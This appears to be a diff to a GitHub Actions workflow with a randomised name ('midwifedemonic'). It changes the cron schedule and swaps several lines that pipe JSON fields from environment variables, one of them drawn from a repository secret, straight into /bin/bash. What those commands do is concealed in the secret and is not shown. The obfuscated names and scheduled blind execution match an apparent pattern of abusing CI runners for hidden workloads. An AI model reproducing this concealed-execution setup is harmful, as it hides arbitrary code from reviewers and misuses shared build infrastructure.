@@ -3,21 +3,24 @@ name: midwifedemonic
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 2/6 * * *'
+    - cron: '48 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: midwifedemonic
         env:
-          t43: ${{ secrets.t43 }}
+          pvnhk4: ${{ secrets.pvnhk4 }}
         run: |
-          echo $t43 | jq -r .yznwu47843 | /bin/bash
-          echo $xeu01599 | jq -r .ce62 | /bin/bash
-          echo $u68127 | jq -r .qpj8089 | /bin/bash
-          echo $zxr1171 | jq -r .uvm795 | /bin/bash
-          echo $vhr8449 | jq -r .dli1 | /bin/bash
-          echo $dpp12014 | jq -r .wadzo0 | /bin/bash
-          echo $p8518 | jq -r .s79089 | /bin/bash
+          echo $pvnhk4 | jq -r .jlcg400 | /bin/bash
+          echo $ad71895 | jq -r .bcajv07763 | /bin/bash
+          echo $ps67 | jq -r .qr865 | /bin/bash
+          echo $nc9899 | jq -r .qey7 | /bin/bash
+          echo $pidd7 | jq -r .gzag5 | /bin/bash
+          echo $mo207 | jq -r .dz61 | /bin/bash
+          echo $mfx48644 | jq -r .pefch84574 | /bin/bash
+          echo $b53 | jq -r .h81415 | /bin/bash
+          echo $x26 | jq -r .j75436 | /bin/bash
 
